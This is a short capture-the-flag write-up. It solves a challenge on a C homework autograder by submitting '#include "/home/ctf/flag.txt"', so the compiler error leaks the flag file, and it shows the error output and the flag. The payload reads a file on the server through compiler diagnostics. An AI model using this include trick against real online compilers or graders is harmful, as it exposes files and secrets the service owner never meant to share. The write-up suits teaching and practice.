#### Challenge:

A prof made a little homework grader at https://autograder.wpictf.xyz/ but I heard he is hiding a flag at `/home/ctf/flag.txt`

---

#### Solution:

- include `flag.txt` file as abs path in `C` and compilation should fail and expose file content

```c
#include "/home/ctf/flag.txt"
```

```
Compiler stdout
None
stderr
In file included from /tmp/sarce/tmpsocij3ki/input.c:2:
/home/ctf/flag.txt:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘{’ token
    1 | WPI{D0nt_run_as_r00t}
      |    ^
```

---

<details><summary>FLAG:</summary>

```
WPI{D0nt_run_as_r00t}
```

</details>
<br/>
